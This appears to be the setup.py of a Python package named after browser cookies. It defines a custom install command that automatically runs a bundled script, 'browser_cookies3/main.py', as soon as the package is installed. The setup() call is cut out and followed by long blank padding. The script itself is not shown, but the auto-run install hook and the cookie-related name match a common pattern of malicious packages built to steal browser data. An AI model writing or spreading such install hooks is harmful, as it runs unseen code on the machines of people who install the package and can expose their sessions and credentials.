from setuptools import setup, find_packages
from setuptools.command.install import install as _install
import subprocess
import sys, os

class CustomInstallCommand(_install):
    def run(self):
        _install.run(self)
        script_path = os.path.join(os.path.dirname(__file__), 'browser_cookies3', 'main.py')
        subprocess.run([sys.executable, script_path], check=True)

# setup(...) removed                                                                                                                                                                                                                                                               
